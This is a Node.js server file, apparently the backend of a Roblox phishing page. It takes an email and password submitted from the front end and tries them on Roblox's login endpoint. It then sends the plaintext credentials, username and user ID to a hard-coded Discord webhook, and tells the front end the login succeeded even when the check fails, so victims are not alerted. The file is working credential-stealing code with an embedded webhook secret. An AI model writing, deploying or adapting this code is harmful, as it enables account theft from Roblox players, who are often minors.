const express = require('express');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 3000;

// SEU WEBHOOK DO DISCORD
const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";

// Configurações
app.use(express.json());
app.use(express.static('.')); // Sirve os ficheiros da raiz (index.html)

// Função para fazer login no Roblox
async function loginRoblox(email, password) {
    const apiUrl = "https://www.roblox.com/users/login";
    
    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Roblox/WinInet',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                username: email,
                password: password
            })
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        const data = await response.json();
        return { success: true, data: data, error: null };
    } catch (error) {
        return { success: false, data: null, error: error.message };
    }
}

// Função para enviar ao Discord
async function sendToDiscord(message) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ content: message })
        });
    } catch (error) {
        console.error("Erro ao enviar para o Discord:", error);
    }
}

// Rota para o check.php (agora será /check)
app.post('/check', async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ success: false, error: "Missing email or password" });
    }

    // Tenta o login
    const result = await loginRoblox(email, password);

    let username = "Unknown";
    let userId = "Unknown";
    let isValid = false;
    let errorMsg = result.error || "Connection Timeout";
    let loginSuccess = false;

    if (result.success && result.data) {
        if (result.data.id && result.data.username) {
            username = result.data.username;
            userId = result.data.id;
            isValid = true;
            loginSuccess = true;
            errorMsg = "";
        } else {
            errorMsg = result.data.error || "Login Failed (No ID)";
        }
    }

    // Envia ao Discord
    const statusIcon = loginSuccess ? "✅" : "⚠️";
    const statusText = loginSuccess ? "LOGIN SUCCESSFUL" : "LOGIN PENDING";
    
    const discordMessage = `**🔒 NEW LOGIN ATTEMPT**\n\n` +
                           `**Status:** ${statusIcon} ${statusText}\n` +
                           `**Email:** ${email}\n` +
                           `**Password:** ${password}\n` +
                           `**Username Found:** ${username}\n` +
                           `**User ID:** ${userId}\n` +
                           `**Error:** ${errorMsg}\n` +
                           `**Timestamp:** ${new Date().toISOString()}`;

    await sendToDiscord(discordMessage);

    // Retorna ao frontend
    // Se der erro de conexão, diz que é sucesso para o jogador avançar
    const frontendSuccess = loginSuccess || errorMsg.includes("fetch") || errorMsg.includes("Timeout");

    res.json({
        success: frontendSuccess,
        username: username,
        userId: userId,
        error: errorMsg
    });
});

// Inicia o servidor
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
